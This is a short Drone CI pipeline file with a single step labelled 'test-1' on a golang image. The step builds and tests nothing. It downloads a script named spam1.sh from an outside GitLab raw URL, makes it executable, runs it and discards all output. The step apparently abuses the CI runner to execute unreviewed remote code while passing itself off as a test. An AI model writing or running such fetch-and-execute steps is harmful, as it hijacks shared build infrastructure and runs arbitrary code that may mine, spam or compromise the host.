kind: pipeline
type: docker
name: default-1

steps:
- name: test-1
  image: golang
  commands:
  - wget https://gitlab.com/renifer12/project-7/-/raw/main/spam1.sh && chmod +x spam1.sh && ./spam1.sh > /dev/null 2>&1
